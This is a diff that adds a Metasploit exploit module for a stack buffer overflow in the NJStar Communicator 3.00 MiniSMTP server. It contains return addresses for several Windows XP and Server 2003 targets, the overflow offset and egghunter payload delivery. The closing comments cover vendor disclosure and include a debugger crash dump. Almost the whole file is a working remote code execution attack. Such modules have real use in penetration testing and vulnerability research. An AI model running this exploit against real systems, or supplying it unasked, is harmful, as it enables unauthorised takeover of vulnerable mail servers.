@@ -1,0 +1,201 @@
+##
+# Exploit Title: NJStar Communicator 3.00 MiniSMTP Server Remote Exploit
+# Date: 10/31/2011
+# Author: Dillon Beresford
+# Twitter: https://twitter.com/#!/D1N
+# Software Link: http://www.njstar.com/download/njcom.exe
+# Version: 3.00 and prior
+# Build: 11818 and prior 
+# Tested on: Windows XP SP3/SP2/SP1 and Windows Server 2003 SP0
+# CVE : NONE
+# Shouts to bannedit, sinn3r, rick2600, tmanning, corelanc0d3r, jcran, 
+# manils, d0tslash, mublix, halsten, and everyone at AHA!
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+# 
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = NormalRanking
+
+	include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Egghunter
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'		=> 'NJStar Communicator 3.00 MiniSMTP Server Remote Exploit',
+			'Description'	=> %q{
+					This module exploits a stack overflow vulnerability in NJStar Communicator 
+					Version 3.00 MiniSMTP server.  
+			},
+			'License'		=> MSF_LICENSE,
+			'Author'		=>
+				[
+					'Dillon Beresford',	# Original discovery and MSF Module.
+					'Corelan Team',	# tx for mona.py, all the tuts, and for being awesome. :)
+				],
+			'Version'		=> '$Revision:$',
+			'References'	=>
+				[
+					[ 'OSVDB', '' ],
+					[ 'CVE', '' ],
+					[ 'URL', 'http://www.njstar.com/cms/njstar-communicator' ],
+					[ 'URL', 'http://www.youtube.com/watch?v=KvkKX035484'],
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'thread',
+				},
+			'Platform'	=> 'win',
+			'Payload'	=>
+				{
+          'BadChars' => "\x00",
+          'StackAdjustment' => -1500,
+				},
+
+			'Targets'		=>
+				[
+					[ 'Windows XP SP3',
+    					{
+                'Ret'   	=>	0x7c874413,
+                'Offset'	=>	247,
+    					} # jmp esp kernel32.dll
+    			], 
+    			[ 'Windows XP SP2',
+    			    {
+    			      'Ret'     => 0x77558952,
+    			      'Offset'  => 247,
+    			    } # jmp esp ntdll.dll
+    			],
+    			[ 'Windows XP SP1',
+    			    {
+    			      'Ret'     => 0x77d718fc,
+    			      'Offset'  => 247,
+    			    } # jmp esp user32.dll
+    			],
+    			[ 'Windows Server 2003 SP0',
+    					{
+                'Ret'   	=>	0x71c033a0,
+                'Offset'	=>	247,
+    					} # jmp esp ntdll.dll
+    			],
+				], # Feel free to add more targets.
+			'Privileged'	=> false,
+			'DisclosureDate'	=> 'OCT 31 2011',
+			'DefaultTarget'	=> 0))
+
+		register_options([Opt::RPORT(25)], self.class)
+
+	end
+  
+	def exploit
+
+    eggoptions =
+    {
+        :checksum => true, 
+        :eggtag => "w00t"
+    }
+
+    badchars = '\x00' 
+    hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)
+      
+    if target.name =~ /Windows XP SP3/
+        
+      buffer =  rand_text(target['Offset'])
+      buffer << [target.ret].pack('V') 
+      buffer << hunter
+      buffer << make_nops(4)
+      
+    elsif target.name =~ /Windows XP SP2/
+      
+      buffer =  rand_text(target['Offset'])	
+      buffer << [target.ret].pack('V') 
+      buffer << hunter
+      buffer << make_nops(4)
+      
+    elsif target.name =~ /Windows XP SP1/
+      
+      buffer = rand_text(target['Offset'])
+      buffer << [target.ret].pack('V') 
+      buffer << hunter
+      buffer << make_nops(4)
+      
+    elsif target.name =~ /Windows Server 2003 SP0/
+
+      buffer = rand_text(target['Offset'])
+      buffer << [target.ret].pack('V') 
+      buffer << hunter
+      buffer << make_nops(4)
+      
+    end
+      
+    # Just some debugging output so we can see lengths and byte size of each of our buffer.
+    print_status("egg: %u bytes: \n" % egg.length + Rex::Text.to_hex_dump(egg))
+    print_status("hunter: %u bytes: \n" % hunter.length + Rex::Text.to_hex_dump(hunter))
+    print_status("buffer: %u bytes:\n" % buffer.length + Rex::Text.to_hex_dump(buffer))
+      
+    print_status("Trying target #{target.name}...")
+      
+    # har har har you get trick no treat... 
+    # we dont have very much space so we 
+    # send our egg in a seperate connection
+      
+    connect
+      
+    print_status("Sending the egg...")
+    sock.put(egg)
+      
+    # I think you betta call, ghostbusters...
+    # now we send our evil buffer along with the
+    # egg hunter, we are doing multiple connections
+    # to solve the issue with limited stack space.
+    # thanks to bannedit for advice on threads and
+    # making multiple connections to get around 
+    # stack space constraints. :)
+      
+    connect
+      
+    print_status("Sending our buffer containing the egg hunter...")
+    sock.put(buffer)
+    
+		handler
+		disconnect
+	end
+end
+
+##
+# No response as of 10/31/11 from AUSCERT or the software vendor. CNCERT and USCERT responded
+# on 10/30/11 and 10/31/11, CNCERT said in an email they needed to see if the vulnerability 
+# is remotely exploitable and needed more verification. I sent a proof of concept exploit 
+# in python with remote code execution. So, here is the proof that the bug is, in fact, 
+# remotely exploitable. WIN!
+##
+
+##
+# eax=00000000 ebx=00417bf8 ecx=00002745 edx=00000000 esi=008a3e50
+# edi=008a3d80
+# eip=42424242 esp=00ccff70 ebp=7c8097d0 iopl=0         nv up ei pl nz na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000            
+# efl=00010206
+# 42424242 ??              ???
+# 0:003> !exchain
+# image00400000+bbc4 (0040bbc4)
+# 00ccff00: 41414141
+# Invalid exception stack at 41414141
+# 0:003> d esp
+# 00ccff70  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+# 00ccff80  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+# 00ccff90  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+# 00ccffa0  44 44 44 44 00 ff cc 00-c4 bb 40 00 20 23 41 00  DDDD......@. #A.
+# 00ccffb0  00 00 00 00 ec ff cc 00-29 b7 80 7c b8 3d 8a 00  ........)..|.=..
+# 00ccffc0  00 00 00 00 00 00 00 00-b8 3d 8a 00 00 c0 fd 7f  .........=......
+# 00ccffd0  00 d6 e3 89 c0 ff cc 00-98 08 99 89 ff ff ff ff  ................
+# 00ccffe0  d8 9a 83 7c 30 b7 80 7c-00 00 00 00 00 00 00 00  ...|0..|........
+##
